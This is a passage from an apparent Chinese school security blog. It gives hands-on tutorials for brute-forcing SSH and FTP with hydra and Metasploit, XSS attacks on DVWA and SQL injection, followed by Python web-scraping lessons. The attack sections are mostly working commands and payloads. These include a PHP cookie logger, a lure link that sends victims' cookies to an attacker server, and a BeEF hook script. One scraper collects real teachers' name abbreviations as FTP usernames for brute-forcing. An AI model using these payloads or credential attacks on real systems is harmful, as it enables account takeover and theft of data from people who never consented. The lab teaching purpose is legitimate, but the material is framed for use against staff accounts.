class="language-none">set threshold 5  # 设置线程数为5set rhosts 192.168.148.130  #  设置地址，地址也可以是一个网段set USER_FILE teacher_name.txt # 设置需要使用的账号字典<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>运行<pre class="line-numbers language-none"><code class="language-none">run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="3-开始爆破"><a href="#3-开始爆破" class="headerlink" title="3.开始爆破"></a>3.开始爆破</h3><pre class="line-numbers language-none"><code class="language-none">hydra -l root -P password.txt 192.168.148.130 ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以使用msf，感觉速度会更快一些，操作和上述相似，只有两步不同。</p><ol><li>找到相应模块<pre class="line-numbers language-none"><code class="language-none">use auxiliary/scanner/ssh/ssh_login<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>设置必要参数<pre class="line-numbers language-none"><code class="language-none">set rhosts 192.168.26.130set username rootset PASS_FILE password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="三、爆破FTP密码"><a href="#三、爆破FTP密码" class="headerlink" title="三、爆破FTP密码"></a>三、爆破FTP密码</h2>账号字典和密码字典我的ftp：pwhdown<br>不要问账号字典怎么来的，问就是捡来的<pre class="line-numbers language-none"><code class="language-none">hydra -L teacher_name.txt -P pass.txt -f 10.163.72.248 ftp -o JJ.txt -V<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="四、防御"><a href="#四、防御" class="headerlink" title="四、防御"></a>四、防御</h2><ol><li>密码使用带https的密文传输和存储</li><li>限制错误次数，锁定账户</li><li>增加尝试间隔，sleep(3)</li><li>验证码，图片验证码、短信验证码、二维码验证码</li><li>统计尝试频率，锁定IP地址</li><li>token机制</li></ol><h2 id="四、特别声明"><a href="#四、特别声明" class="headerlink" title="四、特别声明"></a>四、特别声明</h2><p>本网站没有使用登录验证码，可以无限暴力破解，因为这种漏洞不会危害服务器，所以大家随便玩吧（只有我的账号是超级管理员，是强密码，所以可以不用白费工夫了）。</p><p>特别声明一点，本网站是用于海盐商贸学校计算机专业实战演练的漏洞靶机网站，只能用于学习网络安全相关知识，磨练技能，请记得我们是白帽子阵营，请勿违反<strong>《中华人民共和国网络安全法》</strong>，从事违法犯罪，否则后果自负</p><h1 id="XSS跨站脚本攻击"><a href="#XSS跨站脚本攻击" class="headerlink" title="XSS跨站脚本攻击"></a>XSS跨站脚本攻击</h1><h2 id="一、常用Javascript语句"><a href="#一、常用Javascript语句" class="headerlink" title="一、常用Javascript语句"></a>一、常用Javascript语句</h2><h3 id="1-弹窗警告"><a href="#1-弹窗警告" class="headerlink" title="1.弹窗警告"></a>1.弹窗警告</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'你好，恭喜，你账号密码没了'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-页面嵌套"><a href="#2-页面嵌套" class="headerlink" title="2.页面嵌套"></a>2.页面嵌套</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>http://10.163.72.55</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>300</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>300</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-页面重定向"><a href="#3-页面重定向" class="headerlink" title="3.页面重定向"></a>3.页面重定向</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"本站已停用，请移步到我们新网站并重新登录"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"http://10.163.72.55/"</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-访问外部js"><a href="#4-访问外部js" class="headerlink" title="4.访问外部js"></a>4.访问外部js</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://10.163.72.55/xss.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="二、手动获取cookie"><a href="#二、手动获取cookie" class="headerlink" title="二、手动获取cookie"></a>二、手动获取cookie</h2><ol><li>另外打开一台kail的虚拟机，作为攻击机</li><li>启动apache服务器<pre class="line-numbers language-none"><code class="language-none">service apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>在网站根目录写入一个盗取cookie的js脚本<pre class="line-numbers language-none"><code class="language-none">vim /var/www/html/get_cookie.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment"># 获取cookie</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 以追加方式打开文件，如果没有会自动创建</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 保存文件，记得换行</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 关闭文件</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'恭喜，你密码账号没了'</span><span class="token punctuation">;</span>  <span class="token comment"># 嘲讽拉满</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><em>注意在linux中，ctrl+shift+v才是复制，或者直接按鼠标滚轮也可以</em></li><li>常用vim命令（补充）</li></ol><ul><li><code>i</code>插入模式</li><li><code>o</code>在下一行插入</li><li><code>esc + :wq</code>保存并退出</li><li><code>esc + :e!</code>不保存退出</li><li><code>ctrl+v</code>可视块操作，<code>I</code>插入，<code>esc</code>保存，<code>d</code>删除</li></ul><ol start="5"><li>在地址栏输入kali虚机的ip地址/get_cookie.php，如果没有报404错误，就表示文件存在，当然也可以cat /var/www/html/get_cookie.php再次确认一下</li><li>打开根目录下的写权限<pre class="line-numbers language-none"><code class="language-none">ls -s # 查看权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">chown -R www-data.www-data /var/www/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>登录DVWA靶机，选择XSS stored，现在可以布置脚本了，注意这里的诱导文字很重要，很考验水平。<pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;a href=javascript:location.href="http://10.163.72.55:8090/get_cookie.php?cookie="+document.cookie&gt;兄弟、我找到你想要的资源了，懂的都懂，快来！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>受害者只需要点一下，就可以获得cookie了<pre class="line-numbers language-none"><code class="language-none">cat /var/www/html/cookie.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>盗取账号<br>拿到cookie之后怎么用呢，其实这个cookie就是浏览器缓存的用户身份信息，最简单的方法是安装一个谷歌浏览器插件进行替换，我已经帮你们下载好了，在我的ftp，<strong>pwhdown</strong>，<strong>Cookie Hacker.crx</strong></li></ol><p><em>在谷歌浏览器安装插件时，记得打开开发者模式</em></p><h2 id="三、设置桥接模式"><a href="#三、设置桥接模式" class="headerlink" title="三、设置桥接模式"></a>三、设置桥接模式</h2><p>因为NAT连接的是虚拟交换机，自己的几个虚拟机网卡接到一起，只能自己和自己玩。<br>如果想要连接到真实交换机，先在VMvare点编辑-虚拟网络编辑器-添加网络-VMnet0，选桥接模式，桥接到真实网卡，别连到蓝牙上去了。<br>然后在虚拟机设置中，选择VMnet0（桥接模式），如果外部没有DHCP服务器，我们不能自动获取一个ip地址，就需要自己手动设置一个ip地址。在linux中的方法如下：</p><ol><li>修改网卡配置文件<pre class="line-numbers language-none"><code class="language-none">vim /etc/network/interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">auto eth0iface eth0 inet static  # 配置eth0使用静态地址address 10.163.72.194   # 配置固定IP地址netmask 255.255.255.0   # 配置子网掩码gateway 10.163.72.20    # 配置网关<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><em>提示：配置IP地址之前ping一下，如果提示无法访问目标主机，说明应该没人用。</em></li><li>重启网络<pre class="line-numbers language-none"><code class="language-none">systemctl restart networking<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>关闭networkManager<br>如果没有生效，可能networkManager影响了，networkManager是网络服务的图形管理工具，它会默认接管网络服务。<pre class="line-numbers language-none"><code class="language-none">systemctl stop NetworkManager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>配置DNS<pre class="line-numbers language-none"><code class="language-none">vim /etc/resolv.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nameserver 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>查看IP是否修改完成<pre class="line-numbers language-none"><code class="language-none">ifconfigifconfig eth0 192.168.1.1 # 配置临时IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><em>如果嫌麻烦，可以配置临时ip，不过重启网络服务就没了</em></li></ol><h2 id="四、自动化XSS工具beef"><a href="#四、自动化XSS工具beef" class="headerlink" title="四、自动化XSS工具beef"></a>四、自动化XSS工具beef</h2><ol><li>启动beef<br>第一次启动可能要设置密码，设置密码之后，beef就启动好了<br>beef会提供一个访问地址，127.0.0.1:3000/ui/panel，注意这个地址是本地环回地址，如果想在真机访问，需要把ip换成虚机的ip<br><em>如果设置的密码忘了，可以输入cat /etc/beef-xss/config.yaml查看密码</em></li><li>布置钩子<br>接下来就可以重复之前的套路，把beef自动生成的勾子文件弄到靶机上<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.148.129:3000/hook.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><em>在此之前，记得清空一下dvwa的数据库</em></li><li>收获牛肉<br>打开beef，发现已经有人中招了，现在就可以随便玩了，beef提供了非常多好玩的功能，比如页面弹框，强制跳转，修改页面链接，播放音频，启动摄像头，浏览器窗口拍照，钓鱼等等。太多了，篇幅有限，不详细讲了，请自行摸索吧<h2 id="五、特别声明"><a href="#五、特别声明" class="headerlink" title="五、特别声明"></a>五、特别声明</h2>本网站特意设计了xss跨站攻击漏洞，应该很容易就能找到，因为这种漏洞不会危害服务器，所以大家随便玩吧（一般是危害用户，比如盗别人的账号，利用钓鱼网站骗别人的钱等等）。<br>特别声明一点，本网站是用于海盐商贸学校计算机专业实战演练的漏洞靶机网站，只能用于学习网络安全相关知识，磨练技能，请记得我们是白帽子阵营，请勿违反<strong>《中华人民共和国网络安全法》</strong>，从事违法犯罪，否则后果自负</li></ol><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="一、测试是否有注入点"><a href="#一、测试是否有注入点" class="headerlink" title="一、测试是否有注入点"></a>一、测试是否有注入点</h2><p>先输入一个<code>'</code>(英文单引号)，如果报错You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’’’ at line 1，就证明能够接受单引号，存在SQL注入点。</p><h2 id="二、获得注入点当前数据表全部内容"><a href="#二、获得注入点当前数据表全部内容" class="headerlink" title="二、获得注入点当前数据表全部内容"></a>二、获得注入点当前数据表全部内容</h2><p>原始语句：<code>select first_name,last_name from dvwa.users where user_id=''</code></p><p>SQL注入语句：<code>' or 1=1 --'</code></p><p>注入后语句：<code>mysql -udvwa -pdvwa dvwa -e "select first_name,last_name from dvwa.users where user_id=' ' or 1=1 -- ' '"</code></p><h2 id="三、UNION联合查询"><a href="#三、UNION联合查询" class="headerlink" title="三、UNION联合查询"></a>三、UNION联合查询</h2><p>SQL注入语句：<code> 'union select user(), database() -- '</code></p><p>注入后语句： <code>select first_name,last_name from dvwa.users where user_id=''union select user(),database() -- ''</code></p><p><code>version() </code>获得数据库版本信息<br><code>database() </code>获得当前数据库名<br><code>user()</code> 获得当前用户名<br><em>注意：<code>union</code>后的字段必须和前面的一样，可以一个一个的猜。</em></p><h2 id="四、查询所有的库名及表名"><a href="#四、查询所有的库名及表名" class="headerlink" title="四、查询所有的库名及表名"></a>四、查询所有的库名及表名</h2><p><code>'union select TABLE_SCHEMA, table_name from INFORMATION_SCHEMA.tables -- '</code></p><h2 id="五、获得任意表任意字段数据"><a href="#五、获得任意表任意字段数据" class="headerlink" title="五、获得任意表任意字段数据"></a>五、获得任意表任意字段数据</h2><p><code>'union select 字段1, 字段2 from 数据表 -- '</code></p><p>因为<code>union</code>必须和前面的字段保持一致，如果想多查询几个字段，可以使用<code>concat</code>的方式如下，中间的空格用于将各个字段分隔开。</p><p><code>'union select 字段1, concat(字段2,' ',字段3,' ',字段4) from users -- '</code></p><h2 id="六、盲注点"><a href="#六、盲注点" class="headerlink" title="六、盲注点"></a>六、盲注点</h2><p>有些注入点是只接受用户输入，但是不显示出来，dvwa就提供了一个盲注点。</p><p>SQL注入语句：<code> ' and sleep(5) --</code></p><p>注入后语句：<code> select first_name,last_name from dvwa.users where user_id='1' and sleep(5) --</code></p><p>如果网页显示加载图标就证明这个是一个注入点。</p><video id="video" controls="" src="http://10.163.72.39:7777/123.mp4" preload="none"></video>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫基础</title>
      <link href="/2022/10/29/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/10/29/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h6 id="声明：网站根目录下的robots-txt一般写了爬虫的协议，请遵守道德，不要乱爬，出了事别说是我教的。"><a href="#声明：网站根目录下的robots-txt一般写了爬虫的协议，请遵守道德，不要乱爬，出了事别说是我教的。" class="headerlink" title="声明：网站根目录下的robots.txt一般写了爬虫的协议，请遵守道德，不要乱爬，出了事别说是我教的。"></a>声明：网站根目录下的robots.txt一般写了爬虫的协议，请遵守道德，不要乱爬，出了事别说是我教的。</h6><h2 id="一、三国演义下载（request）"><a href="#一、三国演义下载（request）" class="headerlink" title="一、三国演义下载（request）"></a>一、三国演义下载（request）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests url <span class="token operator">=</span> <span class="token string">"http://10.163.72.39:7777/image/sanguo1.md"</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span> <span class="token comment">#打印对象的响应状态码，以检查请求是否成功</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token comment">#把对象的文本以字符串的形式返回</span><span class="token comment"># 创建一个名为三国演义的txt文档，以写模式打开</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"三国演义.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token comment"># 写进文件中，相当于——  蔡徐坤.吃饭("包子")</span><span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment"># 关闭文档，相当于——    蔡徐坤.睡觉()  </span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="测验：批量爬取三国演义前三章，分别为sanguo2-md和sanguo3-md"><a href="#测验：批量爬取三国演义前三章，分别为sanguo2-md和sanguo3-md" class="headerlink" title="测验：批量爬取三国演义前三章，分别为sanguo2.md和sanguo3.md"></a>测验：批量爬取三国演义前三章，分别为sanguo2.md和sanguo3.md</h6><h2 id="二、爬取一张图片（request）"><a href="#二、爬取一张图片（request）" class="headerlink" title="二、爬取一张图片（request）"></a>二、爬取一张图片（request）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://10.163.72.39/img/angry.55b2c9de.gif'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token comment">#打印对象的响应状态码，以检查请求是否成功</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token comment">#打印对象的二进制编码内容</span><span class="token comment"># 新建了一个文件angry.jpg，这里的文件没加路径，它会被保存在程序运行的当前目录下。</span><span class="token comment"># 图片内容需要以二进制wb读写。</span>photo <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'angry.jpg'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token comment"># 获取pic的二进制内容</span>photo<span class="token punctuation">.</span>write<span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token comment"># 关闭文件</span>photo<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em><strong>练习：我网站的所有图片，自己爬着玩吧</strong></em></p><p><strong>测验：天堂图片网批量爬取，任务要求，批量爬取从高渐离到孙悟空的十几张图片，其中有一张图片被我删除了，在爬取的时候请跳过。</strong></p><p><a href="http://10.163.72.39/%E6%B2%99%E6%BA%A2%E5%A3%81%E7%BA%B8%E5%9B%BE%E7%89%87_212%E5%BC%A0%E9%AB%98%E6%B8%85%E5%9B%BE%E7%89%87%20(%E5%A4%A9%E5%A0%82%E5%9B%BE%E7%89%87%E7%BD%91).html">http://10.163.72.39/%E6%B2%99%E6%BA%A2%E5%A3%81%E7%BA%B8%E5%9B%BE%E7%89%87_212%E5%BC%A0%E9%AB%98%E6%B8%85%E5%9B%BE%E7%89%87%20(%E5%A4%A9%E5%A0%82%E5%9B%BE%E7%89%87%E7%BD%91).html</a></p><h2 id="三、爬取一段视频（request）"><a href="#三、爬取一段视频（request）" class="headerlink" title="三、爬取一段视频（request）"></a>三、爬取一段视频（request）</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests url <span class="token operator">=</span> <span class="token string">'http://10.163.72.39/media/banner3.043818a0.mp4'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>    <span class="token comment">#打印对象的响应状态码，以检查请求是否成功</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token comment">#打印对象的二进制编码内容</span><span class="token comment"># 新建了一个文件banner.mp4，这里的文件没加路径，它会被保存在程序运行的当前目录下。</span><span class="token comment"># 图片内容需要以二进制wb读写。</span>video <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'banner.mp4'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span><span class="token comment"># 获取pic的二进制内容</span>video<span class="token punctuation">.</span>write<span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token comment"># 关闭文件</span>video<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、豆瓣电影top250爬虫（静态网页bs4）"><a href="#四、豆瓣电影top250爬虫（静态网页bs4）" class="headerlink" title="四、豆瓣电影top250爬虫（静态网页bs4）"></a>四、豆瓣电影top250爬虫（静态网页bs4）</h2><p><a href="http://10.163.72.39/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%20Top%20250.html">http://10.163.72.39/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%20Top%20250.html</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>openpyxl<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoupwb<span class="token operator">=</span>openpyxl<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>wb<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">'豆瓣'</span>sheet<span class="token punctuation">[</span><span class="token string">'A1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'电影名'</span>sheet<span class="token punctuation">[</span><span class="token string">'B1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'评分'</span>sheet<span class="token punctuation">[</span><span class="token string">'C1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'推荐语'</span>sheet<span class="token punctuation">[</span><span class="token string">'D1'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'链接'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">'http://10.163.72.39/%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1%20Top%20250.html?start='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'&amp;filter='</span>    <span class="token comment"># url='https://movie.douban.com/top250?start='+str(i)+'&amp;filter='</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token punctuation">}</span>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>    movies<span class="token operator">=</span>soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"info"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> movie <span class="token keyword">in</span> movies<span class="token punctuation">:</span>        href<span class="token operator">=</span>movie<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>        name<span class="token operator">=</span>movie<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        star<span class="token operator">=</span>movie<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"rating_num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        quote<span class="token operator">=</span>movie<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">"quote"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>name<span class="token punctuation">,</span>star<span class="token punctuation">,</span>quote<span class="token punctuation">,</span>href<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>href<span class="token operator">+</span>name<span class="token operator">+</span>star<span class="token operator">+</span>quote<span class="token punctuation">)</span>wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'.\豆瓣爬虫的数据.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、机房管理系统爬虫（静态网页bs4）"><a href="#五、机房管理系统爬虫（静态网页bs4）" class="headerlink" title="五、机房管理系统爬虫（静态网页bs4）"></a>五、机房管理系统爬虫（静态网页bs4）</h2><p>爬取教师姓名的缩写，你们懂的，这个姓名缩写同时也是ftp的账号，可以用来爆破ftp的密码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>re<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSouptxt<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./teacher_name.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">'http://10.163.72.11/index/admin/teacher'</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token punctuation">}</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>items <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'h5'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'card-title'</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'【(.*?)】'</span><span class="token punctuation">)</span>    name <span 